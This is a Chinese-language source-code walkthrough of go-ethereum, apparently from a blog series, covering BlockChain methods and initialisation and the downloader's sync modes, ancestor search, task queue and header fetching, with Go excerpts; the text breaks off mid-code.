InsertChain尝试将给定批量的block插入到规范链中，否则，创建一个分叉。 如果返回错误，它将返回失败块的索引号以及描述错误的错误。\n//插入完成后，将触发所有累积的事件。\nfunc (bc *BlockChain) InsertChain(chain types.Blocks) (int, error){}\n \n// insertChain将执行实际的链插入和事件聚合。 \n// 此方法作为单独方法存在的唯一原因是使用延迟语句使锁定更清晰。\nfunc (bc *BlockChain) insertChain(chain types.Blocks) (int, []interface{}, []*types.Log, error){}\n \n// InsertHeaderChain尝试将给定的headerchain插入到本地链中，可能会创建一个重组\nfunc (bc *BlockChain) InsertHeaderChain(chain []*types.Header, checkFreq int) (int, error){}\n \n// InsertReceiptChain 使用交易和收据数据来完成已经存在的headerchain\nfunc (bc *BlockChain) InsertReceiptChain(blockChain types.Blocks, receiptChain []types.Receipts) (int, error) {}\n//loadLastState从数据库加载最后一个已知的链状态。\nfunc (bc *BlockChain) loadLastState() error {}\n// Processor 返回当前current processor.\nfunc (bc *BlockChain) Processor() Processor {}\n// Reset重置清除整个区块链，将其恢复到genesis state.\nfunc (bc *BlockChain) Reset() error {}\n \n// ResetWithGenesisBlock 清除整个区块链, 用特定的genesis state重塑，被Reset所引用\nfunc (bc *BlockChain) ResetWithGenesisBlock(genesis *types.Block) error {}\n \n// repair尝试通过回滚当前块来修复当前的区块链，直到找到具有关联状态的块。\n// 用于修复由崩溃/断电或简单的非提交尝试导致的不完整的数据库写入。\n//此方法仅回滚当前块。 当前标头和当前快速块保持不变。\nfunc (bc *BlockChain) repair(head **types.Block) error {}\n \n// reorgs需要两个块、一个旧链以及一个新链，并将重新构建块并将它们插入到新的规范链中，并累积潜在的缺失事务并发布有关它们的事件\nfunc (bc *BlockChain) reorg(oldBlock, newBlock *types.Block) error{}\n \n// Rollback 旨在从数据库中删除不确定有效的链片段\nfunc (bc *BlockChain) Rollback(chain []common.Hash) {}\n \n// SetReceiptsData 计算收据的所有非共识字段\nfunc SetReceiptsData(config *params.ChainConfig, block *types.Block, receipts types.Receipts) error {}\n \n// SetHead将本地链回滚到指定的头部。\n// 通常可用于处理分叉时重选主链。对于Header，新Header上方的所有内容都将被删除，新的头部将被设置。\n// 但如果块体丢失，则会进一步回退（快速同步后的非归档节点）。\nfunc (bc *BlockChain) SetHead(head uint64) error {}\n \n// SetProcessor设置状态修改所需要的processor\nfunc (bc *BlockChain) SetProcessor(processor Processor) {}\n \n// SetValidator 设置用于验证未来区块的validator\nfunc (bc *BlockChain) SetValidator(validator Validator) {}\n \n// State 根据当前头区块返回一个可修改的状态\nfunc (bc *BlockChain) State() (*state.StateDB, error) {}\n \n// StateAt 根据特定时间点返回新的可变状态\nfunc (bc *BlockChain) StateAt(root common.Hash) (*state.StateDB, error) {}\n \n// Stop 停止区块链服务，如果有正在import的进程，它会使用procInterrupt来取消。\n// it will abort them using the procInterrupt.\nfunc (bc *BlockChain) Stop() {}\n \n// TrieNode从memory缓存或storage中检索与trie节点hash相关联的数据。\nfunc (bc *BlockChain) TrieNode(hash common.Hash) ([]byte, error) {}\n \n// Validator返回当前validator.\nfunc (bc *BlockChain) Validator() Validator {}\n \n// WriteBlockWithoutState仅将块及其元数据写入数据库，但不写入任何状态。 这用于构建竞争方叉，直到超过规范总难度。\nfunc (bc *BlockChain) WriteBlockWithoutState(block *types.Block, td *big.Int) (err error){}\n \n// WriteBlockWithState将块和所有关联状态写入数据库。\nfunc (bc *BlockChain) WriteBlockWithState(block *types.Block, receipts []*types.Receipt, state *state.StateDB) {}\n \n// writeHeader将标头写入本地链，因为它的父节点已知。 如果新插入的报头的总难度变得大于当前已知的TD，则重新路由规范链\nfunc (bc *BlockChain) writeHeader(header *types.Header) error{}\n \n// 处理未来区块链\nfunc (bc *BlockChain) update() {}\nblockchain初始化\n主要步骤：\n①：创建一个新的headerChain结构\nbc.hc, err = NewHeaderChain(db, chainConfig, engine, bc.getProcInterrupt)\n\n根据number（0）获取genesisHeader\n从rawdb中读取HeadBlock并存储在currentHeader中\n\n②：获取genesisBlock\nbc.genesisBlock = bc.GetBlockByNumber(0)\n③：如果链不为空，则用老的链数据初始化链\nif bc.empty() {\n\t\trawdb.InitDatabaseFromFreezer(bc.db)\n\t}\n④：加载最新的状态数据\nif err := bc.loadLastState(); err != nil {\n\t\treturn nil, err\n\t}\n⑤：检查区块哈希的当前状态，并确保链中没有任何坏块\nfor hash := range BadHashes {\n\t\tif header := bc.GetHeaderByHash(hash); header != nil {\n\t\t\theaderByNumber := bc.GetHeaderByNumber(header.Number.Uint64())\n\t\t\tif headerByNumber != nil &amp;&amp; headerByNumber.Hash() == header.Hash() {\n\t\t\t\tlog.Error(&quot;Found bad hash, rewinding chain&quot;, &quot;number&quot;, header.Number, &quot;hash&quot;, header.ParentHash)\n\t\t\t\tbc.SetHead(header.Number.Uint64() - 1)\n\t\t\t\tlog.Error(&quot;Chain rewind was successful, resuming normal operation&quot;)\n\t\t\t}\n\t\t}\n\t}\n⑥：定时处理future block\ngo bc.update()\n\t-&gt;procFutureBlocks\n\t\t-&gt;InsertChain\n总的来说做了以下几件事：\n\n配置cacheConfig，创建各种lru缓存\n初始化triegc\n初始化stateDb：state.NewDatabase(db)\n初始化区块和状态验证：NewBlockValidator()\n初始化状态处理器：NewStateProcessor()\n初始化区块头部链：NewHeaderChain()\n查找创世区块：bc.genesisBlock = bc.GetBlockByNumber(0)\n加载最新的状态数据：bc.loadLastState()\n检查区块哈希的当前状态，并确保链中没有任何坏块\ngo bc.update() 定时处理future block\n\n加载区块链状态\n①：从数据库中恢复headblock，如果空的话，触发reset chain\nhead := rawdb.ReadHeadBlockHash(bc.db)\n\tif head == (common.Hash{}) {\n\t\tlog.Warn(&quot;Empty database, resetting chain&quot;)\n\t\treturn bc.Reset()\n\t}\n②：确保整个head block是可以获取的，若为空，则触发reset chain\ncurrentBlock := bc.GetBlockByHash(head)\n\tif currentBlock == nil {\n\t\t// Corrupt or empty database, init from scratch\n\t\tlog.Warn(&quot;Head block missing, resetting chain&quot;, &quot;hash&quot;, head)\n\t\treturn bc.Reset()\n\t}\n③：从stateDb中打开最新区块的状态trie，如果打开失败调用bc.repair(&amp;currentBlock)方法进行修复。修复方法就是从当前区块一个个的往前面找，直到找到好的区块，然后赋值给currentBlock。\nif _, err := state.New(currentBlock.Root(), bc.stateCache); err != nil {\n\t\t// Dangling block without a state associated, init from scratch\n\t\tlog.Warn(&quot;Head state missing, repairing chain&quot;, &quot;number&quot;, currentBlock.Number(), &quot;hash&quot;, currentBlock.Hash())\n\t\tif err := bc.repair(&amp;currentBlock); err != nil {\n\t\t\treturn err\n\t\t}\n\t\trawdb.WriteHeadBlockHash(bc.db, currentBlock.Hash())\n\t}\n④：存储当前的headblock和设置当前的headHeader以及头部快速块\nbc.currentBlock.Store(currentBlock)\n....\nbc.hc.SetCurrentHeader(currentHeader)\n...\nbc.currentFastBlock.Store(currentBlock)\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之downloader同步-7":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之downloader同步-7","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之downloader同步-7.md","title":"死磕以太坊源码分析之downloader同步-7","links":[],"tags":[],"content":"\n死磕以太坊源码分析之downloader同步\n需要配合注释代码看：github.com/blockchainGuide/ 给个star哦\n这篇文章篇幅较长，能看下去的是条汉子，建议收藏\n希望读者在阅读过程中，指出问题，给个关注，一起探讨。\n\n概览\ndownloader 模块的代码位于 eth/downloader 目录下。主要的功能代码分别是：\n\n\ndownloader.go ：实现了区块同步逻辑\n\n\npeer.go ：对区块各个阶段的组装，下面的各个FetchXXX 就是很依赖这个模块。\n\n\nqueue.go ：对eth/peer.go的封装\n\n\nstatesync.go ：同步state对象\n\n\n同步模式\nfull  sync\nfull 模式会在数据库中保存所有区块数据，同步时从远程节点同步 header 和 body 数据，而state 和 receipt 数据则是在本地计算出来的。\n在 full 模式下，downloader 会同步区块的 header 和 body 数据组成一个区块，然后通过 blockchain 模块的 BlockChain.InsertChain 向数据库中插入区块。在 BlockChain.InsertChain 中，会逐个计算和验证每个块的 state 和 recepit 等数据，如果一切正常就将区块数据以及自己计算得到的 state、recepit 数据一起写入到数据库中。\nfast sync\nfast 模式下，recepit 不再由本地计算，而是和区块数据一样，直接由 downloader 从其它节点中同步；state 数据并不会全部计算和下载，而是选一个较新的区块（称之为 pivot）的 state 进行下载，以这个区块为分界，之前的区块是没有 state 数据的，之后的区块会像 full 模式下一样在本地计算 state。因此在 fast 模式下，同步的数据除了 header 和 body，还有 receipt，以及 pivot 区块的 state。\n因此 fast 模式忽略了大部分 state 数据，并且使用网络直接同步 receipt 数据的方式替换了 full 模式下的本地计算，所以比较快。\nlight sync\nlight 模式也叫做轻模式，它只对区块头进行同步，而不同步其它的数据。\nSyncMode:\n\nFullSync:从完整区块同步整个区块链历史\nFastSync:快速下载标题，仅在链头处完全同步\nLightSync:仅下载标题，然后终止\n\n区块下载流程\n\n图片只是大概的描述一下，实际还是要结合代码，所有区块链相关文章合集，github.com/blockchainGuide/\n同时希望结识更多区块链圈子的人，可以star上面项目，持续更新\n\n\n首先根据Synchronise开始区块同步，通过findAncestor找到指定节点的共同祖先，并在此高度进行同步，同时开启多个goroutine同步不同的数据：header、receipt、body。假如同步高度为 100 的区块，必须先header同步成功同步完成才可以唤醒body和receipts的同步。\n而每个部分的同步大致都是由FetchParts来完成的，里面包含了各个Chan的配合，也会涉及不少的回调函数，总而言之多读几遍每次都会有不同的理解。接下来就逐步分析这些关键内容。\n\nsynchronise\n①：确保对方的TD高于我们自己的TD\ncurrentBlock := pm.blockchain.CurrentBlock()\n\ttd := pm.blockchain.GetTd(currentBlock.Hash(), currentBlock.NumberU64())\n\tpHead, pTd := peer.Head()\n\tif pTd.Cmp(td) &lt;= 0 {\n\t\treturn\n\t}\n②：开启downloader的同步\npm.downloader.Synchronise(peer.id, pHead, pTd, mode)\n进入函数：主要做了以下几件事：\n\nd.synchronise(id, head, td, mode) ：同步过程\n错误日志输出， 并删除此peer。\n\n进入到d.synchronise，走到最后一步d.syncWithPeer(p, hash, td)真正开启同步。\nfunc (d *Downloader) synchronise(id string, hash common.Hash, td *big.Int, mode SyncMode) error {\n  ...\n  return d.syncWithPeer(p, hash, td)\n}\nsyncWithPeer大概做了以下几件事：\n\n查找祖先findAncestor\n开启单独goroutine分别运行以下几个函数：\n\nfetchHeaders\nprocessHeaders\nfetchbodies\nfetchReceipts\nprocessFastSyncContent\nprocessFullSyncContent\n\n\n\n接下来的文章，以及整个Downloader模块主要内容就是围绕这几个部分进行展开。\n\nfindAncestor\n同步首要的是确定同步区块的区间：顶部为远程节点的最高区块，底部为两个节点都拥有的相同区块的最高高度（祖先区块）。findAncestor就是用来找祖先区块。函数分析如下：\n①：确定本地高度和远程节点的最高高度\nvar (\n\t\tfloor        = int64(-1) // 底部\n\t\tlocalHeight  uint64  // 本地最高高度\n\t\tremoteHeight = remoteHeader.Number.Uint64() // 远程节点最高高度\n\t)\nswitch d.mode {\n\tcase FullSync:\n\t\tlocalHeight = d.blockchain.CurrentBlock().NumberU64()\n\tcase FastSync:\n\t\tlocalHeight = d.blockchain.CurrentFastBlock().NumberU64()\n\tdefault:\n\t\tlocalHeight = d.lightchain.CurrentHeader().Number.Uint64()\n\t}\n②：计算同步的高度区间和间隔\nfrom, count, skip, max := calculateRequestSpan(remoteHeight, localHeight) \n\nfrom:：表示从哪个高度开始获取区块\ncount：表示从远程节点获取多少个区块\nskip：表示间隔，比如skip 为 2 ，获取第一个高度为 5，则第二个就是 8\nmax：表示最大高度\n\n③：发送获取header的请求\ngo p.peer.RequestHeadersByNumber(uint64(from), count, skip, false)\n④：处理上面请求接收到的header  :case packet := &lt;-d.headerCh\n\n丢弃掉不是来自我们请求节的内容\n确保返回的header数量不为空\n验证返回的headers的高度是我们所请求的\n检查是否找到共同祖先\n\n//----①\nif packet.PeerId() != p.id {\n\t\t\t\tlog.Debug(&quot;Received headers from incorrect peer&quot;, &quot;peer&quot;, packet.PeerId())\n\t\t\t\tbreak\n\t\t\t}\n//-----②\nheaders := packet.(*headerPack).headers\n\t\t\tif len(headers) == 0 {\n\t\t\t\tp.log.Warn(&quot;Empty head header set&quot;)\n        return 0\n      }\n//-----③\nfor i, header := range headers {\n\t\t\t\texpectNumber := from + int64(i)*int64(skip+1)\n\t\t\t\tif number := header.Number.Int64(); number != expectNumber { // 验证这些返回的header是否是我们上面请求的headers\n\t\t\t\t\tp.log.Warn(&quot;Head headers broke chain ordering&quot;, &quot;index&quot;, i, &quot;requested&quot;, expectNumber, &quot;received&quot;, number)\n\t\t\t\t\treturn 0, errInvalidChain\n\t\t\t\t}\n\t\t\t}\n//-----④\n// 检查是否找到共同祖先\n\t\t\tfinished = true\n\t\t\t//注意这里是从headers最后一个元素开始查找，也就是高度最高的区块。\n\t\t\tfor i := len(headers) - 1; i &gt;= 0; i-- {\n\t\t\t\t// 跳过不在我们请求的高度区间内的区块\n\t\t\t\tif headers[i].Number.Int64() &lt; from || headers[i].Number.Uint64() &gt; max {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\t// //检查我们本地是否已经有某个区块了，如果有就算是找到了共同祖先，\n\t\t\t\t//并将共同祖先的哈希和高度设置在number和hash变量中。\n\t\t\t\th := headers[i].Hash()\n\t\t\t\tn := headers[i].Number.Uint64()\n \n        \n        \n⑤：如果通过固定间隔法找到了共同祖先则返回祖先，会对其高度与 floor 变量进行验证, floor 变量代表的是共同祖先的高度的最小值,如果找到共同祖先的高度比这个值还小，就认为是两个节点之间分叉太大了，不再允许进行同步。如果一切正常，就返回找到的共同祖先的高度 number 变量。\nif hash != (common.Hash{}) {\n        if int64(number) &lt;= floor {\n            return 0, errInvalidAncestor\n        }\n        return number, nil\n    }\n⑥：如果固定间隔法没有找到祖先则通过二分法来查找祖先，这部分可以思想跟二分法算法类似，有兴趣的可以细看。\n\nqueue详解\nqueue对象和Downloader对象是相互作用的，Downloader的很多功能离不开他，接下来我们介绍一下这部分内容，但是本节，可以先行跳过，等到了阅读下面的关于Queue调用的一些函数部分再回过来阅读这部分讲解。\nqueue结构体\ntype queue struct {\n  mode SyncMode // 同步模式\n  \n  // header处理相关\n  headerHead      common.Hash   //最后一个排队的标头的哈希值以验证顺序\n  headerTaskPool  map[uint64]*types.Header  //待处理的标头检索任务，将起始索引映射到框架标头\n  headerTaskQueue *prque.Prque  //骨架索引的优先级队列，以获取用于的填充标头\n  headerPeerMiss map[string]map[uint64]struct{} //已知不可用的对等头批处理集\n  headerPendPool map[string]*fetchRequest //当前挂起的头检索操作\n  headerResults []*types.Header //结果缓存累积完成的头\n  headerProced int //从结果中拿出来已经处理的header\n  headerContCh chan bool //header下载完成时通知的频道\n  \n  blockTaskPool  map[common.Hash]*types.Header //待处理的块（body）检索任务，将哈希映射到header\n  blockTaskQueue *prque.Prque //标头的优先级队列,以用于获取块（bodies）\n  blockPendPool map[string]*fetchRequest //当前的正在处理的块（body)检索操作\n  blockDonePool map[common.Hash]struct{} //已经完成的块（body)\n  \n\treceiptTaskPool map[common.Hash]*types.Header //待处理的收据检索任务，将哈希映射到header\n\treceiptTaskQueue *prque.Prque //标头的优先级队列,以用于获取收据\n\treceiptPendPool map[string]*fetchRequest //当前的正在处理的收据检索操作\n\treceiptDonePool map[common.Hash]struct{} //已经完成的收据\n\t\n\tresultCache []*fetchResult //下载但尚未交付获取结果\n\tresultOffset uint64 //区块链中第一个缓存的获取结果的偏移量\n\tresultSize common.StorageSize // 块的近似大小\n \n\tlock   *sync.Mutex\n\tactive *sync.Cond\n\tclosed bool\n  \n}\n主要细分功能\n数据下载开始安排任务\n\nScheduleSkeleton:将一批header检索任务添加到队列中，以填充已检索的header skeleton\nSchedule:用来准备对一些 body 和 receipt 数据的下载\n\n数据下载中的各类状态\n\n\npending\npending表示待检索的XXX请求的数量，包括了：PendingHeaders、PendingBlocks、PendingReceipts，分别都是对应取XXXTaskQueue的长度。\n\n\nInFlight\nInFlight表示是否有正在获取XXX的请求，包括：InFlightHeaders、InFlightBlocks、InFlightReceipts，都是通过判断len(q.receiptPendPool) &gt; 0 来确认。\n\n\nShouldThrottle\nShouldThrottle表示检查是否应该限制下载XXX，包括:ShouldThrottleBlocks、ShouldThrottleReceipts，主要是为了防止下载过程中本地内存占用过大。\n\n\nReserve\nReserve通过构造一个 fetchRequest 结构并返回，向调用者提供指定数量的待下载的数据的信息（queue 内部会将这些数据标记为「正在下载」）。调用者使用返回的 fetchRequest 数据向远程节点发起新的获取数据的请求。包括：ReserveHeaders、ReserveBodies、ReserveReceipts。\n\n\nCancel\nCance用来撤消对 fetchRequest 结构中的数据的下载（queue 内部会将这些数据重新从「正在下载」的状态更改为「等待下载」）。包括：CancelHeaders、CancelBodies、CancelReceipts。\n\n\nexpire\nexpire检查正在执行中的请求是否超过了超时限制，包括：ExpireHeaders、ExpireBodies、ExpireReceipts。\n\n\nDeliver\n当有数据下载成功时，调用者会使用 deliver 功能用来通知 queue 对象。包括：DeliverHeaders、DeliverBodies、DeliverReceipts。\n\n\n数据下载完成获取区块数据\n\nRetrieveHeaders\n在填充 skeleton 完成后，queue.RetrieveHeaders 用来获取整个 skeleton 中的所有 header。\nResults\nqueue.Results 用来获取当前的 header、body 和 receipt（只在 fast 模式下） 都已下载成功的区块（并将这些区块从 queue 内部移除）\n\n\n函数实现\nScheduleSkeleton\nqueue.ScheduleSkeleton主要是为了填充skeleton，它的参数是要下载区块的起始高度和所有 skeleton 区块头，最核心的内容则是下面这段循环：\nfunc (q *queue) ScheduleSkeleton(from uint64, skeleton []*types.Header) {\n    ......\n    for i, header := range skeleton {\n        index := from + uint64(i*y)\n        q.headerTaskPool[index] = header\n        q.headerTaskQueue.Push(index, -int64(index))\n    }\n}\n假设已确定需要下载的区块高度区间是从 10 到 46，MaxHeaderFetch 的值为 10，那么这个高度区块就会被分成 3 组：10 - 19，20 - 29，30 - 39，而 skeleton 则分别由高度为 19、29、39 的区块头组成。循环中的 index 变量实际上是每一组区块中的第一个区块的高度（比如 10、20、30），queue.headerTaskPool 实际上是一个每一组区块中第一个区块的高度到最后一个区块的 header 的映射\nheaderTaskPool = {\n  10: headerOf_19,\n\t20: headerOf_20,\n\t30: headerOf_39,\n}\n\nReserveHeaders\nreserve 用来获取可下载的数据。\nreserve  = func(p *peerConnection, count int) (*fetchRequest, bool, error) {\n\t\t\treturn d.queue.ReserveHeaders(p, count), false, nil\n\t\t}\nfunc (q *queue) ReserveHeaders(p *peerConnection, count int) *fetchRequest {\n  if _, ok := q.headerPendPool[p.id]; ok {\n\t\treturn nil\n\t} //①\n  ...\n  send, skip := uint64(0), []uint64{}\n\tfor send == 0 &amp;&amp; !q.headerTaskQueue.Empty() {\n\t\tfrom, _ := q.headerTaskQueue.Pop()\n\t\tif q.headerPeerMiss[p.id] != nil {\n\t\t\tif _, ok := q.headerPeerMiss[p.id][from.(uint64)]; ok {\n\t\t\t\tskip = append(skip, from.(uint64))\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\t\tsend = from.(uint64) // ②\n\t}\n  \n ...\n  for _, from := range skip {\n\t\tq.headerTaskQueue.Push(from, -int64(from))\n\t} // ③\n  ...\n  request := &amp;fetchRequest{\n\t\tPeer: p,\n\t\tFrom: send,\n\t\tTime: time.Now(),\n\t}\n\tq.headerPendPool[p.id] = request // ④\n  \n}\n①：根据headerPendPool来判断远程节点是否正在下载数据信息。\n②：从headerTaskQueue取出值作为本次请求的起始高度，赋值给send变量，在这个过程中会排除headerPeerMiss所记录的节点下载数据失败的信息。\n③：将失败的任务再重新写回task queue\n④：利用send变量构造fetchRequest结构，此结构是用来作为FetchHeaders来使用的：\nfetch = func(p *peerConnection, req *fetchRequest) error { \n    return p.FetchHeaders(req.From, MaxHeaderFetch) \n}\n至此，ReserveHeaders会从任务队列里选择最小的起始高度并构造fetchRequest传递给fetch获取数据。\n\nDeliverHeaders\ndeliver = func(packet dataPack) (int, error) {\n\t\t\tpack := packet.(*headerPack)\n\t\t\treturn d.queue.DeliverHeaders(pack.peerID, pack.headers, d.headerProcCh)\n\t\t}\n①：如果发现下载数据的节点没有在 queue.headerPendPool 中，就直接返回错误；否则就继续处理，并将节点记录从 queue.headerPendPool 中删除。\nrequest := q.headerPendPool[id]\n\tif request == nil {\n\t\treturn 0, errNoFetchesPending\n\t}\n\theaderReqTimer.UpdateSince(request.Time)\n\tdelete(q.headerPendPool, id)\n②：验证headers\n包括三方面验证：\n\n检查起始区块的高度和哈希\n检查高度的连接性\n检查哈希的连接性\n\nif accepted {\n\t\t//检查起始区块的高度和哈希\n\t\tif headers[0].Number.Uint64() != request.From {\n\t\t\t...\n\t\t\taccepted = false\n\t\t} else if headers[len(headers)-1].Hash() != target {\n\t\t\t...\n\t\t\taccepted = false\n\t\t}\n\t}\n\tif accepted {\n\t\tfor i, header := range headers[1:] {\n\t\t\thash := header.Hash() // 检查高度的连接性\n\t\t\tif want := request.From + 1 + uint64(i); header.Number.Uint64() != want {\n\t\t\t\t...\n\t\t\t}\n\t\t\tif headers[i].Hash() != header.ParentHash { // 检查哈希的连接性\n\t\t\t\t...\n\t\t\t}\n\t\t}\n\t}\n③： 将无效数据存入headerPeerMiss，并将这组区块起始高度重新放入headerTaskQueue\nif !accepted {\n\t...\n\t\tmiss := q.headerPeerMiss[id]\n\t\tif miss == nil {\n\t\t\tq.headerPeerMiss[id] = make(map[uint64]struct{})\n\t\t\tmiss = q.headerPeerMiss[id]\n\t\t}\n\t\tmiss[request.From] = struct{}{}\n\t\tq.headerTaskQueue.Push(request.From, -int64(request.From))\n\t\treturn 0, errors.New(&quot;delivery not accepted&quot;)\n\t}\n④：保存数据，并通知headerProcCh处理新的header\nif ready &gt; 0 {\n\t\tprocess := make([]*types.Header, ready)\n\t\tcopy(process, q.headerResults[q.headerProced:q.headerProced+ready])\n\t\tselect {\n\t\tcase headerProcCh &lt;- process:\n\t\t\tq.headerProced += len(process)\n\t\tdefault:\n\t\t}\n\t}\n⑤：发送消息给.headerContCh，通知skeleton 都被下载完了\nif len(q.headerTaskPool) == 0 {\n\t\tq.headerContCh &lt;- false\n\t}\nDeliverHeaders 会对数据进行检验和保存，并发送 channel 消息给 Downloader.processHeaders 和 Downloader.fetchParts的 wakeCh 参数。\n\nSchedule\nprocessHeaders在处理header数据的时候，会调用queue.Schedule 为下载 body 和 receipt 作准备。\ninserts := d.queue.Schedule(chunk, origin)\nfunc (q *queue) Schedule(headers []*types.Header, from uint64) []*types.Header {\n\tinserts := make([]*types.Header, 0, len(headers))\n\tfor _, header := range headers {\n    //校验\n    ...\n\t\tq.blockTaskPool[hash] = header\n\t\tq.blockTaskQueue.Push(header, -int64(header.Number.Uint64()))\n \n\t\tif q.mode == FastSync {\n\t\t\tq.receiptTaskPool[hash] = header\n\t\t\tq.receiptTaskQueue.Push(header, -int64(header.Number.Uint64()))\n\t\t}\n\t\tinserts = append(inserts, header)\n\t\tq.headerHead = hash\n\t\tfrom++\n\t}\n\treturn inserts\n}\n这个函数主要就是将信息写入到body和receipt队列，等待调度。\n\nReserveBody&amp;Receipt\n在 queue 中准备好了 body 和 receipt 相关的数据， processHeaders最后一段，是唤醒下载Bodyies和Receipts的关键代码，会通知 fetchBodies 和 fetchReceipts 可以对各自的数据进行下载了。\nfor _, ch := range []chan bool{d.bodyWakeCh, d.receiptWakeCh} {\n\t\t\t\tselect {\n\t\t\t\tcase ch &lt;- true:\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t}\n而fetchXXX 会调用fetchParts，逻辑类似上面的的，reserve最终则会调用reserveHeaders，deliver 最终调用的是 queue.deliver.\n先来分析reserveHeaders：\n①：如果没有可处理的任务，直接返回\nif taskQueue.Empty() {\n        return nil, false, nil\n    }\n②：如果参数给定的节点正在下载数据，返回\n if _, ok := pendPool[p.id]; ok {\n        return nil, false, nil\n    }\n③：计算 queue 对象中的缓存空间还可以容纳多少条数据\nspace := q.resultSlots(pendPool, donePool)\n④：从 「task queue」 中依次取出任务进行处理\n主要实现以下功能：\n\n计算当前 header 在 queue.resultCache 中的位置，然后填充 queue.resultCache 中相应位置的元素\n处理空区块的情况，若为空不下载。\n处理远程节点缺少这个当前区块数据的情况，如果发现这个节点曾经下载当前数据失败过，就不再让它下载了。\n\n注意：resultCache 字段用来记录所有正在被处理的数据的处理结果，它的元素类型是 fetchResult 。它的 Pending 字段代表当前区块还有几类数据需要下载。这里需要下载的数据最多有两类：body 和 receipt，full 模式下只需要下载 body 数据，而 fast 模式要多下载一个 receipt 数据。\nfor proc := 0; proc &lt; space &amp;&amp; len(send) &lt; count &amp;&amp; !taskQueue.Empty(); proc++ {\n\t\theader := taskQueue.PopItem().(*types.Header)\n\t\thash := header.Hash()\n\t\tindex := int(header.Number.Int64() - int64(q.resultOffset))\n\t\tif index &gt;= len(q.resultCache) || index &lt; 0 {\n\t\t\t....\n\t\t}\n\t\tif q.resultCache[index] == nil {\n\t\t\tcomponents := 1\n\t\t\tif q.mode == FastSync {\n\t\t\t\tcomponents = 2\n\t\t\t}\n\t\t\tq.resultCache[index] = &amp;fetchResult{\n\t\t\t\tPending: components,\n\t\t\t\tHash:    hash,\n\t\t\t\tHeader:  header,\n\t\t\t}\n\t\t}\n  \n\t\tif isNoop(header) {\n\t\t\tdonePool[hash] = struct{}{}\n\t\t\tdelete(taskPool, hash)\n \n\t\t\tspace, proc = space-1, proc-1\n\t\t\tq.resultCache[index].Pending--\n\t\t\tprogress = true\n\t\t\tcontinue\n\t\t}\n\t\tif p.Lacks(hash) {\n\t\t\tskip = append(skip, header)\n\t\t} else {\n\t\t\tsend = append(send, header)\n\t\t}\n\t}\n最后就是构造 fetchRequest 结构并返回。\n\nDeliverBodies&amp;Receipts\nbody 或 receipt 数据都已经通过 reserve 操作构造了 fetchRequest 结构并传给 fetch，接下来就是等待数据的到达,数据下载成功后，会调用 queue 对象的 deliver 方法进行传递，包括 queue.DeliverBodies 和 queue.DeliverReceipts。这两个方法都以不同的参数调用了 queue.deliver 方法:\n①：如果下载的数据数量为 0，则把所有此节点此次下载的数据标记为「缺失」\nif results == 0 {\n\t\tfor _, header := range request.Headers {\n\t\t\trequest.Peer.MarkLacking(header.Hash())\n\t\t}\n\t}\n②：循环处理数据，通过调用reconstruct 填充 resultCache[index] 中的相应的字段\nfor i, header := range request.Headers {\n  ...\n  if err := reconstruct(header, i, q.resultCache[index]); err != nil {\n\t\t\tfailure = err\n\t\t\tbreak\n\t\t}\n}\n③：验证resultCache 中的数据，其对应的 request.Headers 中的 header 都应为 nil，若不是则说明验证未通过，需要假如到task queue重新下载\nfor _, header := range request.Headers {\n\t\tif header != nil {\n\t\t\ttaskQueue.Push(header, -int64(header.Number.Uint64()))\n\t\t}\n\t}\n④：如果有数据被验证通过且写入 queue.resultCache 中了（accepted &gt; 0），发送 queue.active 消息。Results 会等待这这个信号。\n\nResults\n当(header、body、receipt)都下载完，就要将区块写入到数据库了，queue.Results 就是用来返回所有目前已经下载完成的数据，它在 Downloader.processFullSyncContent 和 Downloader.processFastSyncContent 中被调用。代码比较简单就不多说了。\n到此为止queue对象就分析的差不多了。\n\n同步headers\n继续回到syncWithPeer函数中，来讲下面比较关键的几个点。\nfetchHeaders\n同步headers 是是由函数fetchHeaders来完成的。\nfetchHeaders的大致思想：\n同步header的数据会被填充到skeleton，每次从远程节点获取区块数据最大为MaxHeaderFetch（192），所以要获取的区块数据如果大于192 ，会被分成组，每组MaxHeaderFetch，剩余的不足192个的不会填充进skeleton，具体步骤如下图所示：\n\n此种方式可以避免从同一节点下载过多错误数据，如果我们连接到了一个恶意节点，它可以创造一个链条很长且TD值也非常高的区块链数据。如果我们的区块从 0 开始全部从它那同步，也就下载了一些根本不被别人承认的数据。如果我只从它那同步 MaxHeaderFetch 个区块，然后发现这些区块无法正确填充我之前的 skeleton（可能是 skeleton 的数据错了，或者用来填充 skeleton 的数据错了），就会丢掉这些数据。\n接下来查看下代码如何实现：\n①：发起获取header的请求\n如果是下载skeleton，则会从高度 from+MaxHeaderFetch-1 开始（包括），每隔 MaxHeaderFetch-1 的高度请求一个 header，最多请求 MaxSkeletonSize 个。如果不是的话，则要获取完整的headers 。\n②：等待并处理headerCh中的header数据\n2.1 确保远程节点正在返回我们需要填充skeleton所需的header\nif packet.PeerId() != p.id {\n\t\t\t\tlog.Debug(&quot;Received skeleton from incorrect peer&quot;, &quot;peer&quot;, packet.PeerId())\n\t\t\t\tbreak\n\t\t\t}\n2.2 如果skeleton已经下载完毕，则需要继续填充skeleton\nif packet.Items() == 0 &amp;&amp; skeleton {\n\t\t\t\tskeleton = false\n\t\t\t\tgetHeaders(from)\n\t\t\t\tcontinue\n\t\t\t}\n2.3 整个skeleton填充完成，并且没有要获取的header了，要通知headerProcCh全部完成\nif packet.Items() == 0 {\n\t\t\t\t//下载pivot时不要中止标头的提取\n\t\t\t\tif atomic.LoadInt32(&amp;d.committed) == 0 &amp;&amp; pivot &lt;= from {\n\t\t\t\t\tp.log.Debug(&quot;No headers, waiting for pivot commit&quot;)\n\t\t\t\t\tselect {\n\t\t\t\t\tcase &lt;-time.After(fsHeaderContCheck):\n\t\t\t\t\t\tgetHeaders(from)\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tcase &lt;-d.cancelCh:\n\t\t\t\t\t\treturn 